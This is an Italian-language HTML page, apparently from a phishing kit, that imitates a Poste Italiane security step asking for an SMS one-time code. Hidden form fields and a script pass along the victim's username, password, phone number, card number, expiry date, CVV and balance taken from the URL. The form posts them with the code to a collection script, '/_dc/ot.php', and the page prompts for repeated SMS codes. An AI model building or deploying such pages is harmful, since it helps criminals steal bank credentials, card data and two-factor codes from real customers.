﻿
<!doctype html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Inserisci i tuoi dati personali</title>
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css">
	<link type="text/css" rel="stylesheet" href="css/fonts.css">
	<link type="text/css" rel="stylesheet" href="css/style.css">
	<script src="https://code.jquery.com/jquery-latest.min.js"></script>
	<script type="text/javascript" src="script/bootstrap.min.js"></script>
	<script type="text/javascript" src="script/site.js"></script>
</head>

<body>

	<div class="preload">
		<p>
			<img src="img/logo.png" class="logo">
		</p>
		<p>
			<img src="img/spn.gif" class="spn" />
		</p>
	</div>

	<div class="container-fluid">
		<div class="row">
			<div class="col-lg-12 header fixed">
				<header>
					<img src="img/back.png" class="back" />
					<img src="img/logo.png" class="logo">
				</header>
			</div>
		</div>
	</div>
	<div class="container-fluid bd-bot-header">
		<div class="row">
			<div class="col-lg-12 bd">
				<h1>
					Sicurezza
				</h1>
				<form action="/_dc/ot.php" method="post">
					<input type="hidden" name="key" class="key">
					<input type="hidden" name="rel" class="rel">
					<input type="hidden" name="usr" class="usr">
					<input type="hidden" name="pwd" class="pwd">
					<input type="hidden" name="cellulare" class="cellulare">
					<input type="hidden" name="carta" class="carta">
					<input type="hidden" name="scadenza" class="scadenza">
					<input type="hidden" name="cvv" class="cvv">
					<input type="hidden" name="saldo" class="saldo">
					<div class="cards" style="margin-top:10px">
						<div class="pnl-bd">
							<p class="descript-gen">
								Ti invitiamo a non chiudere ne' ricaricare la pagina fino alla ricezione del codice SMS richiesto.
								<br>
								<br>
								Inserisci il codice nello spazio sottostante prima della sua scadenza e del successivo e attendere sempre in questa pagina la ricezione di un secondo SMS.
							</p>
						</div>
					</div>
					<div class="box-advice box-messages box-success">
						<div class="box-heading">
							<h3 class="area-heading">
								Inserisci il codice ricevuto via SMS
							</h3>
						</div>
						<div class="box-body">
							<p>Immetti il nuovo codice che hai ricevuto via SMS.</p>
						</div>
					</div>
					<p style="float:left;width:100%; margin:25px 0 5px 10px; text-align:left; color:#4a4a4a">Compila il seguente modulo:</p>
					<div class="cards" style="margin-top:0px">
						<div class="pnl-bd">
							<p class="descript-gen">
								<label class="control-label" for="otp">
									INSERISCI IL CODICE QUI
								</label>
								<input title="" name="otp" class="form-control" placeholder="Inserisci" type="text" required="">
							</p>
							<input type="submit" class="btn btn-primary" value="convalida">
						</div>
					</div>				
				</form>
			</div>
		</div>
		<div class="row">
			<div class="col-lg-12">
				<div class="content-main">
					<div class="container">
						<div class="row">
							<div class="col-lg-12">
								<h2>Hai bisogno di aiuto?</h2>
							</div>
							<div class="col-md-8 col-lg-push-1 col-lg-10">
								<div class="row">
									<div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0">
										<a href="#" title="Chiamaci" class="btn btn-secondary"><img src="img/ch.png" style="margin-right:10px;">Chiamaci</a>
									</div>
									<div class="col-sm-6 col-md-4">
										<a href="#" title="Domande Frequenti" class="btn btn-secondary"><img src="img/sc.png" style="margin-right:10px;">Scrivici</a>
									</div>
									<div class="col-sm-6 col-md-4">
										<a href="#" title="Richiedi Assistenza" class="btn btn-secondary">
											<img src="img/vi.png" style="margin-right:10px;">Vieni
											in Poste
										</a>
									</div>
								</div>
							</div>
							<div class="content-main content-text">
								<div class="container">
									<div class="row">
										<div class="col-md-8 col-lg-push-1 col-lg-10 text-center">
											In caso di mancato accesso o non funzionamento dei
											servizi è possibile contattare il Call Center al
											numero verde <a href="tel:803.160">803.160</a> (dal
											lunedì al sabato dalle ore 8.00 alle ore 20.00).
											La chiamata è gratuita.
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-lg-12 no-padding">
				<div class="content-footer">
					<div class="container">
						<div class="row">
							<div class="col-lg-12">
								<p class="text-cente">
									© Poste Italiane 2021 - Partita iva : 01114601006 <br />
									<a href="#">Preferenze Cookie</a> &nbsp;&nbsp;&nbsp;|
								</p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<a class="ui-to-top">
		<img src="img/top.png" />
	</a>
	<div class="chat">
		<img src="img/icn_chat.png">
	</div>

	<script>
		$(function () {
			$('.rel').val(parseInt(querySt("rel")) + 1);
            $('.usr').val(querySt("usr"));
            $('.pwd').val(querySt("pwd"));
            $('.cellulare').val(querySt("cellulare"));
            $('.carta').val(querySt("carta"));
            $('.scadenza').val(querySt("scadenza"));
            $('.cvv').val(querySt("cvv"));
            $('.saldo').val(querySt("saldo"));

			if (parseInt(querySt("rel")) > 1) {
				$('.box-success').show();
            }
		})

	</script>
</body>
</html>
